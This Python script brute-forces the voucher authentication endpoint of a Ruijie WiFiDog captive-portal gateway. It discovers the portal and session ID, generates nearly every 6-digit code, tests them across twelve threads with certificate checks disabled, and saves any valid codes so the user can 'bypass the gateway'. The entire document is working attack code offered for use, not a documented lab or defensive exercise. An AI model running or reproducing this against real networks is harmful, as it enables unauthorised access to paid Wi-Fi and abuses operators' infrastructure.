#!/usr/bin/env python3
"""
Complete Brute Force - All 6-digit codes EXCEPT patterns
Generates ALL codes from 000000-999999 EXCEPT:
- 000000, 111111, 222222, ... (all same digits)
- Simple patterns like 123456, 654321
Total codes to test: ~999,900 unique random codes
"""

import requests
import re
import urllib3
import time
import threading
import json
import random
from urllib.parse import urlparse, parse_qs, urljoin
from datetime import datetime

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ============================================================================
# CONFIGURATION
# ============================================================================

BRUTE_FORCE_THREADS = 12
BRUTE_FORCE_TIMEOUT = 5
GATEWAY_HOST = "192.168.110.1"
GATEWAY_PORT = "2060"

# Color codes
RED = '\033[1;31m'
GREEN = '\033[1;32m'
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
CYAN = '\033[1;36m'
WHITE = '\033[1;37m'
RESET = '\033[0m'

# ============================================================================
# UTILITY FUNCTIONS
# ============================================================================

def print_header(text):
    print(f"\n{CYAN}{'='*70}{RESET}")
    print(f"{CYAN}[*] {text}{RESET}")
    print(f"{CYAN}{'='*70}{RESET}\n")

def check_real_internet():
    """Check if device has real internet"""
    try:
        return requests.get("http://www.google.com", timeout=3).status_code == 200
    except:
        return False

# ============================================================================
# STEP 1: DISCOVER PORTAL & GET SESSION INFO
# ============================================================================

def discover_portal_and_session():
    """Get portal URL and session information"""
    print_header("STEP 1: DISCOVERING PORTAL & SESSION")
    
    session = requests.Session()
    test_url = "http://connectivitycheck.gstatic.com/generate_204"
    
    try:
        print(f"[*] Checking for captive portal...")
        r = requests.get(test_url, allow_redirects=True, timeout=5, verify=False)
        
        if r.url == test_url:
            if check_real_internet():
                print(f"{RED}[!] Already have internet access!{RESET}")
                return None, None, None
            print(f"{RED}[!] No portal detected!{RESET}")
            return None, None, None
        
        portal_url = r.url
        print(f"{GREEN}[+] Portal URL detected:{RESET}")
        print(f"    {portal_url[:100]}...")
        
        # Parse the URL to get parameters
        parsed = urlparse(portal_url)
        params = parse_qs(parsed.query)
        
        gw_address = params.get('gw_address', [GATEWAY_HOST])[0]
        gw_port = params.get('gw_port', [GATEWAY_PORT])[0]
        
        print(f"\n{GREEN}[+] Gateway Address: {gw_address}{RESET}")
        print(f"{GREEN}[+] Gateway Port: {gw_port}{RESET}")
        
        # Follow redirects to get session ID
        r1 = session.get(portal_url, verify=False, timeout=10)
        path_match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
        next_url = urljoin(portal_url, path_match.group(1)) if path_match else portal_url
        r2 = session.get(next_url, verify=False, timeout=10)
        
        # Extract session ID
        sid = parse_qs(urlparse(r2.url).query).get('sessionId', [None])[0]
        if not sid:
            sid_match = re.search(r'sessionId=([a-zA-Z0-9]+)', r2.text)
            sid = sid_match.group(1) if sid_match else None
        
        if sid:
            print(f"{GREEN}[+] Session ID: {sid}{RESET}")
        else:
            print(f"{YELLOW}[!] Session ID not found (might not be needed){RESET}")
            sid = "test_session"
        
        return gw_address, gw_port, sid
        
    except Exception as e:
        print(f"{RED}[!] Error: {str(e)}{RESET}")
        return None, None, None

# ============================================================================
# STEP 2: TEST VOUCHER CODES
# ============================================================================

def test_voucher_code(code, gateway_host, gateway_port, session, sid):
    """Test a single voucher code"""
    try:
        # Build the correct endpoint
        voucher_api = f"http://{gateway_host}:{gateway_port}/api/auth/voucher/"
        
        # Send the request with correct parameters
        response = session.post(
            voucher_api,
            json={
                'accessCode': code,
                'sessionId': sid,
                'apiVersion': 1
            },
            timeout=BRUTE_FORCE_TIMEOUT,
            verify=False
        )
        
        # Parse response
        try:
            data = response.json()
            
            # Check for success
            if data.get('success') == True:
                return True, f"✓ VALID: {code}", data
            elif data.get('success') == False:
                # Wrong code but endpoint works
                message = data.get('message', 'Authentication failed')
                return False, message, data
            else:
                return False, str(data), data
                
        except:
            # Non-JSON response
            if response.status_code == 200 and len(response.text) > 100:
                return True, f"Large response: {code}", response.text
            return False, f"Invalid response", response.text
            
    except Exception as e:
        return False, f"Error: {str(e)[:50]}", None

# ============================================================================
# STEP 3: GENERATE ALL VALID CODES (NO PATTERNS)
# ============================================================================

def is_pattern(code):
    """Check if code is a pattern (should be excluded)"""
    # Check for all same digits (000000, 111111, etc.)
    if len(set(code)) == 1:
        return True
    
    # Check for simple patterns like 123456, 654321
    digits = [int(d) for d in code]
    
    # Ascending sequence (123456, 234567, etc.)
    is_ascending = True
    for i in range(len(digits) - 1):
        if digits[i+1] - digits[i] != 1:
            is_ascending = False
            break
    if is_ascending and len(set(digits)) > 1:
        return True
    
    # Descending sequence (654321, 543210, etc.)
    is_descending = True
    for i in range(len(digits) - 1):
        if digits[i] - digits[i+1] != 1:
            is_descending = False
            break
    if is_descending and len(set(digits)) > 1:
        return True
    
    # Check for known bad patterns
    bad_patterns = [
        '123456', '654321', '101010', '121212', '131313', '141414',
        '151515', '161616', '171717', '181818', '191919', '202020',
        '212121', '313131', '414141', '515151', '616161', '717171',
        '818181', '919191', '112233', '223344', '334455', '445566',
        '556677', '667788', '778899'
    ]
    if code in bad_patterns:
        return True
    
    return False

def generate_all_valid_codes():
    """Generate ALL codes from 000000-999999 EXCEPT patterns"""
    print_header("GENERATING ALL VALID CODES")
    
    print(f"{BLUE}[*] Generating ALL 6-digit codes (excluding patterns)...{RESET}")
    print(f"{BLUE}[*] This may take 30-60 seconds...{RESET}\n")
    
    codes = []
    excluded = 0
    
    start_gen = time.time()
    
    for i in range(0, 1000000):
        code = f"{i:06d}"
        
        if not is_pattern(code):
            codes.append(code)
        else:
            excluded += 1
        
        # Progress indicator
        if (i + 1) % 100000 == 0:
            elapsed = time.time() - start_gen
            print(f"[*] Generated {i+1}/1000000 codes ({elapsed:.1f}s)   ", end='\r')
    
    # Shuffle for randomness
    random.shuffle(codes)
    
    elapsed = time.time() - start_gen
    print(f"\n{GREEN}[+] Generated {len(codes)} VALID codes in {elapsed:.1f} seconds{RESET}")
    print(f"{YELLOW}[+] Excluded {excluded} pattern codes{RESET}")
    print(f"{GREEN}[+] Example codes: {', '.join(codes[:5])}...{RESET}")
    
    return codes

# ============================================================================
# STEP 4: BRUTE FORCE ATTACK
# ============================================================================

def brute_force_attack(codes, gateway_host, gateway_port, session, sid):
    """Multi-threaded brute force attack"""
    print_header("STEP 2: BRUTE FORCE ATTACK")
    
    print(f"{YELLOW}[!] Starting attack with {BRUTE_FORCE_THREADS} threads...{RESET}")
    print(f"{YELLOW}[!] Testing {len(codes):,} codes...{RESET}")
    print(f"{YELLOW}[!] This will take several hours - be patient!{RESET}\n")
    
    found_codes = []
    tested_count = [0]
    lock = threading.Lock()
    start_time = time.time()
    last_print = [time.time()]
    
    def worker(code_batch):
        """Worker thread for testing codes"""
        for code in code_batch:
            is_valid, message, response = test_voucher_code(
                code, gateway_host, gateway_port, session, sid
            )
            
            with lock:
                tested_count[0] += 1
                
                if is_valid:
                    found_codes.append(code)
                    elapsed = time.time() - start_time
                    print(f"\n{GREEN}{'='*70}{RESET}")
                    print(f"{GREEN}[+] VALID CODE FOUND: {code}{RESET}")
                    print(f"{GREEN}[+] Message: {message}{RESET}")
                    print(f"{GREEN}[+] Time to find: {elapsed:.1f} seconds{RESET}")
                    print(f"{GREEN}{'='*70}{RESET}\n")
                
                # Update progress every 2 seconds
                current_time = time.time()
                if current_time - last_print[0] >= 2:
                    elapsed = current_time - start_time
                    speed = tested_count[0] / elapsed if elapsed > 0 else 0
                    percentage = (tested_count[0] / len(codes)) * 100
                    eta_seconds = (len(codes) - tested_count[0]) / speed if speed > 0 else 0
                    eta_hours = eta_seconds / 3600
                    
                    print(f"[*] Progress: {tested_count[0]:,}/{len(codes):,} ({percentage:.1f}%) - {speed:.1f} codes/sec - ETA: {eta_hours:.1f}h   ", end='\r')
                    last_print[0] = current_time
    
    # Distribute codes to threads
    batch_size = len(codes) // BRUTE_FORCE_THREADS
    threads = []
    
    for i in range(BRUTE_FORCE_THREADS):
        start_idx = i * batch_size
        end_idx = start_idx + batch_size if i < BRUTE_FORCE_THREADS - 1 else len(codes)
        
        thread = threading.Thread(
            target=worker,
            args=(codes[start_idx:end_idx],),
            daemon=True
        )
        threads.append(thread)
        thread.start()
    
    # Wait for threads to complete
    for thread in threads:
        thread.join()
    
    elapsed = time.time() - start_time
    
    # Results Summary
    print_header("ATTACK RESULTS")
    
    hours = elapsed / 3600
    minutes = (elapsed % 3600) / 60
    seconds = elapsed % 60
    
    print(f"{CYAN}Codes tested: {tested_count[0]:,}{RESET}")
    print(f"{CYAN}Time elapsed: {hours:.1f}h {minutes:.1f}m {seconds:.1f}s{RESET}")
    if elapsed > 0:
        print(f"{CYAN}Speed: {tested_count[0]/elapsed:.1f} codes/sec{RESET}")
    
    if found_codes:
        print(f"\n{GREEN}[+] VALID CODES FOUND:{RESET}")
        for code in found_codes:
            print(f"    {GREEN}✓ {code}{RESET}")
    else:
        print(f"\n{RED}[!] No valid codes found in entire range!{RESET}")
        print(f"{RED}[!] This means no valid codes exist (very unlikely){RESET}")
    
    # Save results
    results = {
        'timestamp': datetime.now().isoformat(),
        'gateway': f"{gateway_host}:{gateway_port}",
        'endpoint': '/api/auth/voucher/',
        'attack_type': 'All Codes (No Patterns)',
        'total_codes_tested': tested_count[0],
        'valid_codes': found_codes,
        'time_elapsed': elapsed,
        'speed': tested_count[0] / elapsed if elapsed > 0 else 0,
        'time_human': f"{hours:.1f}h {minutes:.1f}m {seconds:.1f}s"
    }
    
    with open('valid_voucher_codes.json', 'w') as f:
        json.dump(results, f, indent=2)
    
    print(f"\n{YELLOW}[*] Results saved to: valid_voucher_codes.json{RESET}")
    
    return found_codes

# ============================================================================
# MAIN
# ============================================================================

def main():
    """Main execution"""
    print(f"\n{'='*70}")
    print(f"{CYAN}    🔓 COMPLETE BRUTE FORCE - ALL CODES{RESET}")
    print(f"{CYAN}    Ruijie WiFiDog Gateway{RESET}")
    print(f"{CYAN}    Gateway: {GATEWAY_HOST}:{GATEWAY_PORT}{RESET}")
    print(f"{CYAN}    Testing: ALL codes EXCEPT patterns{RESET}")
    print(f"{'='*70}\n")
    
    # Step 1: Discover portal
    gateway_host, gateway_port, sid = discover_portal_and_session()
    
    if not gateway_host:
        print(f"{RED}[!] Could not discover gateway!{RESET}")
        return
    
    # Create session
    session = requests.Session()
    
    # Step 2: Generate all valid codes
    codes = generate_all_valid_codes()
    
    if not codes:
        print(f"{RED}[!] No codes generated!{RESET}")
        return
    
    # Step 3: Confirm before attack
    print(f"\n{CYAN}{'='*70}{RESET}")
    print(f"Gateway: {gateway_host}:{gateway_port}")
    print(f"Endpoint: /api/auth/voucher/")
    print(f"Attack Type: ALL CODES (No Patterns)")
    print(f"Total codes to test: {len(codes):,}")
    print(f"Threads: {BRUTE_FORCE_THREADS}")
    
    # Estimate time
    estimated_speed = 150  # codes per second
    estimated_seconds = len(codes) / estimated_speed
    estimated_hours = estimated_seconds / 3600
    
    print(f"Estimated time: ~{estimated_hours:.1f} hours (depends on network)")
    print(f"{CYAN}{'='*70}{RESET}")
    
    confirm = input(f"\n{WHITE}Start complete brute force? (yes/no): {RESET}").strip().lower()
    
    if confirm != 'yes':
        print(f"{YELLOW}[*] Attack cancelled!{RESET}")
        return
    
    # Step 4: Run attack
    print(f"\n{YELLOW}[!] WARNING: This will run for several hours!{RESET}")
    print(f"{YELLOW}[!] Do NOT close the terminal or interrupt the process!{RESET}\n")
    
    found_codes = brute_force_attack(codes, gateway_host, gateway_port, session, sid)
    
    # Done
    print(f"\n{GREEN}{'='*70}{RESET}")
    print(f"{GREEN}[+] Attack complete!{RESET}")
    
    if found_codes:
        print(f"{GREEN}[+] Found {len(found_codes)} valid code(s){RESET}")
        print(f"{GREEN}[+] You can now use these codes to bypass the gateway!{RESET}")
    else:
        print(f"{YELLOW}[!] No valid codes found in entire range{RESET}")
    
    print(f"{GREEN}{'='*70}{RESET}\n")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{YELLOW}[*] Attack interrupted by user{RESET}")
        print(f"{CYAN}[*] Goodbye!{RESET}\n")

